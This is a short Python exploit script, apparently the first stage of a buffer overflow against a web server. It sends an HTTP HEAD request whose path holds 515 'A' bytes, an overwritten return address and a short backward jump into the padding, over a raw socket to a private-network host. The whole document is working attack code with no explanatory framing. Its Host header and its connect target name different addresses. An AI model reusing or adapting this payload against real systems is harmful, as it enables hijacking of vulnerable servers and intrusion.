import socket
import os
import sys

#/EB == Short jump
#jumps -60 bytes back into 515 A region
 
Stage1 = "A"*515+"\x59\x54\xC3\x77" + "\xEB\xC4"
 
buffer = (
"HEAD /" + Stage1 + " HTTP/1.1\r\n"
"Host: 192.168.111.128:8080\r\n"
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")
 
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.43.229", 80))
expl.send(buffer)
expl.close()
